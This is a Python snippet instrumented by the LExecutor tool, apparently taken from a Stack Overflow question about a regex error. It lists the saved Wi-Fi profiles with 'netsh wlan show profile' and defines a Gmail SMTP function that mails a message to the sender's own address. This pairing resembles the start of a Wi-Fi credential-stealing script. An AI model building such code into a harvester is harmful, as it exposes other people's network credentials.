# LExecutor: DO NOT INSTRUMENT

#Source: https://stackoverflow.com/questions/67065998/typeerror-cannot-use-a-string-pattern-on-a-bytes-like-object-regex-not-getting
from lexecutor.Runtime import _n_
from lexecutor.Runtime import _a_
from lexecutor.Runtime import _c_
from lexecutor.Runtime import _l_
def send_mail(email, password, message):
 _l_(366369)

 server = _c_(366346, _a_(366345, _n_(366344, "smtplib", lambda: smtplib), "SMTP"), "smtp.gmail.com", 587)
 _l_(366347)
 _c_(366350, _a_(366349, _n_(366348, "server", lambda: server), "starttls"))
 _l_(366351)
 _c_(366356, _a_(366353, _n_(366352, "server", lambda: server), "login"), _n_(366354, "email", lambda: email), _n_(366355, "password", lambda: password))
 _l_(366357)
 _c_(366363, _a_(366359, _n_(366358, "server", lambda: server), "sendmail"), _n_(366360, "email", lambda: email), _n_(366361, "email", lambda: email), _n_(366362, "message", lambda: message))
 _l_(366364)
 _c_(366367, _a_(366366, _n_(366365, "server", lambda: server), "quit"))
 _l_(366368)


command = "netsh wlan show profile"
_l_(366370)
networks = _c_(366374, _a_(366372, _n_(366371, "subprocess", lambda: subprocess), "check_output"), _n_(366373, "command", lambda: command), shell=True)
_l_(366375)
network_names = _c_(366379, _a_(366377, _n_(366376, "re", lambda: re), "search"), ":Profile\s*:\s(.*)", _n_(366378, "networks", lambda: networks) )
_l_(366380)

_c_(366385, _n_(366381, "print", lambda: print), _c_(366384, _a_(366383, _n_(366382, "network_names", lambda: network_names), "group"), 0))
_l_(366386)